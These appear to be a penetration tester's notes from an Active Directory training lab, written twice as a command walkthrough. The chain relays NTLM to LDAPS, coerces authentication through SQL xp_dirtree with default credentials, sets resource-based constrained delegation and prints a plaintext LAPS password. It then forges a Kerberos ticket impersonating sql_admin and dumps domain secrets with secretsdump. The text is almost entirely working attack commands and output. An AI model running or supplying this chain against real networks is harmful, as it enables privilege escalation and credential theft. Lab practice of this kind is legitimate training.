```
SERVER04$----Generic-ALL----SERVER03$ 

#run from kali ntlmralyx impackets --delegate-access

 sudo proxychains  impacket-ntlmrelayx  -t ldaps://192.168.24.10 --delegate-access  -i  

#from svc_ata acct query the kali box 
#update dns 
PS C:\tmp> Invoke-DNSUpdate -DNSType A -DNSNAME cuhawk.megabank.local -DNSData 10.10.14.123

#runquery xp_dirtree notice the Cybernetics-Prolab query via webdav also is because webservices is enabled on the machine 
osql -S SERVER04\RE7_MS -U Admin -P Admin -Q "EXECUTE('master.sys.xp_dirtree''\\cuhawk@80\a''');"


#from kali now connect to ldap shell 

nc 127.0.0.1 11000 


# set the set_rbcd flag 
 
set_rbcd SERVER04$ svc_ata
Found Target DN: CN=SERVER04,CN=Computers,DC=megabank,DC=local
Target SID: S-1-5-21-997099906-443949041-4154774969-1107

Found Grantee DN: CN=svc_ata,CN=Users,DC=megabank,DC=local
Grantee SID: S-1-5-21-997099906-443949041-4154774969-1109
Delegation rights modified successfully!
svc_ata can now impersonate users on SERVER04$ via S4U2Proxy


To get gmsa password for login 

PS C:\tmp> . .\Power-V.ps1
. .\Power-V.ps1

PS C:\tmp> 
PS C:\tmp> Get-DomainComputer server03
Get-DomainComputer server03


s-mcs-admpwdexpirationtime   : 133528357248698356
lastlogoff                    : 12/31/1600 4:00:00 PM
ms-mcs-admpwd                 : XP258rDQs1vCgBd44
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=megabank,DC=local




#from kali request a ticket and sync time 

sudo net time set -S dc.0x0security.local 

proxychains impacket-getST -spn CIFS/SERVER04.MEGABANK.LOCAL -ts megabank.local/svc_ata:****** -dc-ip 192.168.24.10 -impersonate 'sql_admin' 


export KRB5CCNAME=sql_admin.ccache

proxychains impacket-secretsdump megabank.local/sql_admin@SERVER04.MEGABANK.LOCAL -k -no-pass  

```


```
#run from kali ntlmralyx impackets --delegate-access
sudo proxychains  impacket-ntlmrelayx  -t ldaps://192.168.24.10 --delegate-access  -i  

#from svc_ata acct query the kali box 
#update dns 
PS C:\tmp> Invoke-DNSUpdate -DNSType A -DNSNAME cuhawk.megabank.local -DNSData 10.10.14.123 //use ur dnstool

#runquery xp_dirtree notice the Cybernetics-Prolab query via webdav also is because webservices is enabled on the machine 
osql -S SERVER04\RE7_MS -U Admin -P Admin -Q "EXECUTE('master.sys.xp_dirtree''\\cuhawk@80\a''');"

#from kali now connect to ldap shell 
nc 127.0.0.1 11000 

# set the set_rbcd flag 
set_rbcd SERVER04$ svc_ata

#from kali request a ticket and sync time
sudo net time set -S dc.0x0security.local 
proxychains impacket-getST -spn CIFS/SERVER04.MEGABANK.LOCAL -ts megabank.local/svc_ata:****** -dc-ip 192.168.24.10 -impersonate 'sql_admin' 
export KRB5CCNAME=sql_admin.ccache
proxychains impacket-secretsdump megabank.local/sql_admin@SERVER04.MEGABANK.LOCAL -k -no-pass  

```
